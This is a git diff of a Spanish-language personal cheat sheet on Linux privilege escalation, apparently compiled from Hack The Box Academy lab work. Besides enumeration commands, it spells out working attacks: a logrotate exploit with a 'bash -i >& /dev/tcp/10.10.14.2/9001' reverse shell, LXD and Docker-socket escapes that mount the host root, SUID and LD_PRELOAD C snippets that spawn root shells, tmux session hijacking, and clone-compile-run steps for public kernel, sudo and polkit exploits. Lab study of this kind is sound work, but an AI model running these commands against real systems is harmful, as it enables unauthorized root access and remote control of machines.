@@ -1,4 +1,6 @@
 	### Linux PRIVESC
+Este file esta creado siguiendo el path y modulo de Linux privilege scalation en la Academy de HTB.
+El otro file en este mismo directorio sobre privesc fue creado haciendo maquinas sin un orden en la data como va a tener este.
 
 	## Enumeracion
 ps aux | grep root
@@ -9,10 +11,20 @@ history
 #Sirve para ver el historial de comandos
 sudo -l
 #Permite enumerar los comandos que el usuario puede correr como sudo sin password
+
 cat /etc/passwd
 #Revisar si hay hashes
 cat /etc/shadow
 #Revisar si tenemos acceso de lectura
+cat /etc/os-release
+#Obtener informacion del OS
+uname -a
+#Permite ver el kernel y la versin del mismo
+cat /etc/group    
+#Permite listar todos los grupos existentes
+getent group sudo 
+#Permite listar usuarios que pertenecen al grupo sudo (en este ejemplo, puede ser cualquier otro)
+
 find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
 #Buscar directorios con capacidad de escritura
 find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
@@ -21,10 +33,15 @@ find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
 #Permite enumerar todos los archivos ocultos
 find / -type d -name ".*" -ls 2>/dev/null
 #Permite enumerar todos los directorios ocultos
-cat /etc/os-release
-#Obtener informacion del OS
-uname -a
-#Permite ver el kernel y la versin del mismo
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
+#Permite encontrar archivos history creados por scripts o programas
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+#Permite enumerar la informacion de procesos con cmdline
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+#Permite enumerar archivos de configuracion presentes en el sistema
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+#Permine enumerar por scripts presentes en el sistema
+
 echo $PATH
 #Revisar el path del usr
 env
@@ -35,10 +52,244 @@ lpstat
 #Permite enumerar impresoras attacheadas al sistema. Si hay trabajos en cola, puden tener info sensible
 netstat -nat
 #Permite enumerar los puertos abiertos en la maquina
-cat /etc/group
-#Permite listar todos los grupos existentes
-getent group sudo
-#Permite listar usuarios que pertenecen al grupo sudo (en este ejemplo, puede ser cualquier otro)
+lastlog
+#Permite conocer los ultimos logueos de los usuarios, ver la actividad y saber que tanto se usa el sistma.
+w  
+#Permite conocer los usuarios logueados
+
 ls -l /tmp /var/tmp /dev/shm
 #Listar contenido de directorios temporales
+ls -l /bin /usr/bin/ /usr/sbin/
+#Listar el contenido de estos directorios en busca de binarios. Luego se puede usar GTFObins
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+#Nos generamos una lista con binarios que coinciden para verificarlos
+
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+#Permite enumerar los paquetes instalados en el sistema
+sudo -V
+#Enumera la version de sudo que se tiene. Puede llegar a tener known vulns
+
+	
+	## Environment-based privesc
+PATH=.:$PATH
+export PATH
+#Permite modificar el path agregando . (directorio actual).
+echo $(<flag.txt)
+#Este metodo es uno de los tantos que existe para escapar de una shell restricta. En este caso, se tiene acceso al comando echo y este puede ser utilizado para leer archivos o hasta para leer directorios
+echo *
+#De esta forma se lista el directorio como si fuese el comando cd
+
+	## Permissions-based privesc
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+#setuid permite al usuario ejecutar un programa con permisos de otro. setuid se muestra como un s en los permisos del file
+find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
+#setgid permite ejecutar un programa con permisos como si fueramos parte del grupo que lo creo
+https://gtfobins.github.io/
+#Si hay files con este permiso, se debe revisar GTFOBins
+sudo -l
+#Como se explico en enum, se listan los archivos que se pueden ejecutar sin password como un usuario X
+
+LXC / LXD groups
+#Es equivalente a docker y es el administrador de containers de ubuntu. Una vez instalado, se le da el grupo a todos los usuarios. Si tenemos root en el container es posible ir a /mnt/root para visitar la carpeta root el sistema principal
+110(lxc)
+#Proceso linux container
+Proceso:
+unzip alpine.zip 
+lxd init
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+#Con true, no se separa el root del sistema con el del container
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+lxc exec r00t /bin/sh
+#Se spawnea una shell dentro del container
+
+116(lxd)
+#Grupo Linux deamon
+cd ContainerImages
+#Carpeta donde se encuentran las imagenes
+lxc image import <image name> --alias ubuntutemp
+#Se importa la imagen
+lxc image list
+#Se verifican las imagenes
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+#Estos dos comandos sirven para iniciar y configurar el container. El true del final permite que podamos actuar en el host 
+lxc start privesc
+lxc exec privesc /bin/bash
+#Esto nos genera una shell como root en el container. Probar con /bin/sh si no funciona
+ls -l /mnt/root
+#Estando en el container, podemos ir al path de arriba (que tambien se especifico en otro comando anterior) para llegar al sistema hoat. Al igual que con LXC, root en container nos da root en el host.
+
+4(adm) group
+#Este grupo permite leer /var/log
+
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+#Permite enumerar capabilities de los diferentes binarios que poseen
+
+	## Service-based privesc: Vulnerable services
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+#Permite enumerar los paquetes instalados en el sistema
+<application> -v
+#Ver versiones de las aplicaciones
+
+	## Service-based privesc: Cron jobs
+pspy (https://github.com/DominicBreuker/pspy)
+#Es un tool que permite ver las tareas que se ejecutan en un sistema en X tiempo. Mal manejo de estos archivos lleva a priv esc.
+
+	## Service-based privesc: Docker
+Docker Sockets
+#Es un file que nos permite comunicarnos con Docker deamon. Esto permite interactuar con el docket deamon y, en caso de estar mal configurado, llevar a privesc.
+docker image ls
+#Permite enumerar que docker se usa
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+#El socket writable se encuentra usualmente en /var/run. Con el comando anterior podemos llegar a tener root en el sistema host
+
+	## Service-based privesc: Logrotate
+/etc/logrotate.conf
+#Es el archivo de configuracion de Logrotate que determina el funcionamiento de la tarea cron que ejecuta el logrotate
+/var/lib/logrotate.status
+#Si se quiere realizar la rotacion de los logs de forma forzosa, se puede agregar la fecha en la que esto se realiza en las lineas del status. Cada linea contiene el path a diferentes logs.
+/etc/logrotate.d/
+#Path donde se encuentran los archivos de configuracion de logrotate.
+Para explotar logrotate se necesita:
+	1- Vulnerable versions:
+		3.8.6
+		3.11.0
+		3.15.0
+		3.18.0
+	2- Logrotate tiene que ejecutarse como root
+	3- Permisos de escritura en los logs
+https://github.com/whotwagner/logrotten
+#Este es un script para poder explotar esta vulnerabilidad
+cd logrotten
+gcc logrotten.c -o logrotten
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+./logrotten -p ./payload /tmp/tmp.log
+#Estos son los difernetes comandos que se corren para que se logre explotar esta vuln. Recordar arrancar el listener para nuestra reverse shell.
+
+	## Service-based privesc: Miscellaneous Techniques
+tcpdump
+#Si esta instalado puede generar que un usuario no autorizado capture trafico. Si en este trafico hay credenciales en cleartext, se pueden ver.
+https://github.com/DanMcInerney/net-creds
+https://github.com/lgandx/PCredz
+#Dos tools que pueden usarse para esto
+
+showmount -e 10.129.2.12
+#NFS permite listar los diferentes directorios que se comparten
+cat /etc/exports
+#Listando esto con un usuario en el host con pocos privilegios podemos saber si se configuro NFS como no_root_squash. Esto nos permitiria poder subir cosas a NFS y que se guarden con el usuario subido. Si subimos /bin/sh con SUID, podriamor ir al host con la cuenta de bajos privilegios y ejecutar bash -p para ser root
+include <stdio.h>
+include <sys/types.h>
+include <unistd.h>
+int main(void)
+{
+  setuid(0); setgid(0); system("/bin/bash");
+}
+#Contenido de shell.c (todo lo que esta fuera de llaves va comentado). Esto se pone en la montura, se le da chmod para SUID y se ejecuta con el usr de bajos privilegios dle host target
+
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+ps aux | grep tmux
+ls -la /shareds
+tmux -S /shareds
+#Hijacking de una sesion tmux. Al ibtener acceso a una cuenta correspondiente al grupo devs (en este caso) y existe una sesion tmux abierta, podemos hijack la sesion con el ultimo comando
+
+
+	## Internals-based privesc: Kernel
+uname -a
+#Nos permite ver la version del kernel para buscar vulnerabilidades de la version
+cat /etc/lsb-release
+#Enumeramos la version de la distro
+
+	## Internals-based privesc: Librerias compartidas
+static & dynamically libreries
+#Son librerias que pasan a formar parte del codigo cuando este es compilado. Las estaticas (extension .a) no pueden modificarse mientras que las dinamicas (extension .so) si.
+-rpath o -rpath-link
+#Con estas flags mientras se compila un programa, se le especifica donde deberia buscar las librerias al ejecutarse
+LD_RUN_PATH o LD_LIBRARY_PATH
+#Con estas variables de entorno apuntando a /lib o /usr/lib (default) o /etc/ld.so.conf tambien pueden especificar a donde buscar las librerias
+LD_PRELOAD
+#Esta variable de entorno puede cargar una lubreria despues de ejecutar un binario
+ldd /bin/ls
+#Permite ver los shared objects que necesita un binario
+include <stdio.h>
+include <sys/types.h>
+include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/bash");
+}
+#Los include tienen que ir comentados. Este codigo en C nos va a permitir abusar de LD_PRELOAD
+gcc -fPIC -shared -o root.so root.c -nostartfiles
+#Se compila el codigo
+sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
+#En el ejemplo del lab, el usr puede ejecutar con sudo sin pswd un programa que se especifica con la ruta absoluta. Esto en principio no tiene un problema. Por ese motivo nos abusamos de la env var
+
+https://academy.hackthebox.com/module/51/section/476
+readelf -d <SETUID binary>  | grep PATH
+#Siguiendo con las librerias, otra forma de explotar esta vulnerabilidad es revisando el 'runpath' path.
+ldd <binary>
+#Si la libreria que se usa en el binario se puede mover al path anterior y al usar ldd nuevamente se modifico, significa que es vulnerable
+include<stdio.h>
+include<stdlib.h>
+void dbquery() {
+    printf("Malicious library loaded\n");
+    setuid(0);
+    system("/bin/sh -p");
+} 
+#En el ejemplo del modulo, al ejecutar el programa fallo por la falta de una funcion llamada dbquery. El codigo en C de arriba define la funcion para darnos root
+gcc src.c -fPIC -shared -o /development/libshared.so
+#Se compila el codigo y se ejecuta el binario. Luego de esto, deberiamos tener root
+
+	## Internals-based privesc: Librerias python
+grep -r "def <nombre funcion>" /usr/local/lib/python3.8/dist-packages/psutil/*
+#En el caso de tener un .py con SUID/SGID se puede intenta hijack una funcion que utlice. Para buscar la funcion se utiliza el comando de arriba. Si se tiene permisos de escritura se puede modificar dicha funcion importada
+Crear archivo importado
+#La existencia de un import X en el codigo de python puede generar vulnerabilidades. Si se crea un archivo .py con el nombre del import, puede agregarse codigo para ejecutar. Si se le suma el SUID, esto genera que al correrlo con sudo (en caso de poder) nos ejecute el codigo como root
+
+	
+	## Recent 0-Days: Sudo
+sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
+#Ver que puede ejecutar cada grupo/usuario con privilegios
+
+sudo -V | head -n1
+#Ver version de sudo para buscar vulnerabilidades
+
+Sudo < 1.8.28 -> CVE-2019-14287 
+#Para abusar de esta vuln se debe poder ejecutar un binario con permisos elevados
+sudo -u#-1 <binario>
+#Da shell root si se le pasa un id negativo
+
+	## Recent 0-Days: Polkit
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+#Se compila, ejecuta y te da root
+
+        ## Recent 0-Days: DirtyPipe
+git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
+bash compile.sh
+./exploit-1
+#ref. https://academy.hackthebox.com/module/51/section/1597
+
+	## Recent 0-Days: Netfilter
+Netfilter es un modulo del kernet que brinda filtrado de paquetes, traduccion de direcciones de red y mas cosas de firewalls.
+
+Kernel vulnerable: 2.6 - 5.11
+wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+./exploit
+#Se descarga, compila y ejecuta
+
+kernel vulnerable: 5.4 - 5.6.10
+git clone https://github.com/Bonfee/CVE-2022-25636.git
+make
+./exploit
+#Se descarga, se compila y se ejecuta
+
+kernel vulnerable: Hasta la 6.3.1
+git clone https://github.com/Liuk3r/CVE-2023-32233
+gcc -Wall -o exploit exploit.c -lmnl -lnftnl
+./exploit
 
